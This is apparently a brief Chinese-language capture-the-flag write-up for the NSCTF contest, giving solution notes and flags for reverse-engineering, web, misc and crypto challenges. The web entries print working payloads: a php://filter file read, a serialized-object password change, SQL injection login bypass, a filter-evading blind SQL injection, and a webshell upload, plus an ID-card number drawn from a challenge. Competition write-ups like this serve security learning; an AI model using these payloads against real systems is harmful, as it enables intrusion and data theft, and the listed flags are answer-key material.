##re1
	ASCII找到flag:{NSCTF_md5065ca>01??ab7e0f4>>a701c>cd17340}
	异或0x7
	712df97688fe0b7a399f076d9dc60437


###re2
	找字符串
	flag:{NSCTF_md57e0cad17016b0>?45?f7c>0>4a>1c3a0}
	异或0x7
	NSCTF_md50b7dfc60761e798328a0d9793f96d4f7
###re500
	pyc逆字节码运行getflag5()即可
	flag:{NSCTF_md576d958d8a8640dfe2ada4811aef59b26}

### web1

	index.php
	flag:{NSCTF_1E72F25BA71580D7D7DDBD25ACF4A8F3}


###web2
	Referer: http://www.nsctf.net/
	X-Forwarded-For: 101.200.73.168

	Wm14aFp6cDdUbE5EVkVaZk5EZzRZamRoTW1SalkyUXdNbUUzTXpReE5qVmpNemxpWVRRMU1UZGtZ
	ZmxhZzp7TlNDVEZfNDg4YjdhMmRjY2QwMmE3MzQxNjVjMzliYTQ1MTdkYmN9
	flag:{NSCTF_488b7a2dccd02a734165c39ba4517dbc}

###web3
	key和ver都是5.5.9-1ubuntu4.12
	NjY2YzYxNjczYTdiNGU1MzQzNTQ0NjVmMzY2MzM3Mzk2NTM5NjIzMzM2NjMzMDM4NjIzMDMwMzAzMzM1MzIzODM3NjEzODM4NjMzNjYzNjE2MjM5MzA2Njdk
	666c61673a7b4e534354465f36633739653962333663303862303030333532383761383863366361623930667d
	flag:{NSCTF_6c79e9b36c08b00035287a88c6cab90f}

###web4

	找到password.txt
	username=admin&password=Nsf0cuS
	290bca70c7dae93db6644fa00b9d83b9.php
	本来看到以为是xss,结果直接改userlevel=root就好

	flag={NSCTF_76b44eac527ad5c8789f5d2e0f1ede9a}
###web5
	
	rot13,逆序,base64,移位,逆序
	flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}
	
###web6

	改if里面的==为=号直接输出用户名密码
	G0od!JAVA3C41PTISAGO 1pt_Pa4sW0rd_K3y_H3re
	登陆后给出base64 解密 key_Ch3ck_.txt
	继续 Ch3ck_Au7h.php
	检查作者
	uname,upass提交
	flag:{NSCTF_d7590edfdf8bcf958ced10cec94273a}

###web7
	
	Xiaoming09231995
	开房记录 王伟   身份证号34112519831224875X
	
	flag:{NSCTF_3ad65730a8f203a5ab861169e9547f6d}

###web08
	php://filter/read=convert.base64-encode/resource=index.php
	flag:{NSCTF_9bac7a6e289bf89ee0061bd0abdef0ab}

###web09
	base64(md5(20150923)),id=3
	
	/.index.php.swp
	审计
		http://www.nsctf.net:8000/fa81bb665474f11c025b5355582af315/web/09/changepassword.php?userInfo=a:2:{s:2:"id";s:1:"1";s:4:"pass";s:8:"20150923";}&oldPass=20150923&newPass=6666
	flag:{NSCTF_98c5bf58e35877fc76ce03f0f01327c5}
###web10
	源码:http://www.nsctf.net:8000/fa81bb665474f11c025b5355582af315/web/10/index.php.
	先_CONFIG=1取消掉config,注释sql
		password=/*!OR*/%1=1%23&username=\&Submit=%E6%8F%90%E4%BA%A4&_CONFIG=1
		flag:{NSCTF_adf0ff1eb152b1e3398ba4523fc713f}

###web11
	可上传php5
	暴力上传生成小马,index.php里面发现flag
	flag{NSCTF_8f0fc74ddf786103ed56d20af3bf269}

###web12
	时间盲注 payload
	字段flag
		sexlect(ord(substr((SELExCT(group_concat(column_name))FROM(information_schema.columns)WHERE(table_name)%2513%2527flag%2527),1,1)))>1
	内容
		username=admin%2527and(selexct(selxect(slexep(5))and(selecxt(ord(substr((selexct(flag)from(flag)),12,1))>13))))%23&filtername=x&Submit=%E6%8F%90%E4%BA$A4
	flag:{NSCTF_98c5bf58e35877fc76ce03f0f01327c5}
###Misc1

	md5 nsfocous666


###Misc2

	提取出来key.rar 密码是nsfocous+5数字 爆破之
	nsfocous56317

	flag{NCTF_R4r_Cr4ck}

###Misc3
	主要是三个段 消费 初始 余额  确保两个等式正确 算一下就行 每1.8是B4
	flag{NSCTF_RfID_Cr4ck}

###Crypto
	直接AES解密 flag{DISJV_Hej_UdShofjyed} 
	凯撒
	NSCTF_Rot_EnCryption


###Crypto2

	分离图片,第二个就是flag
	flag{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}
###Crypto3
	stegslove: blue0 反选 flag{NSCTF_Qr_C0De}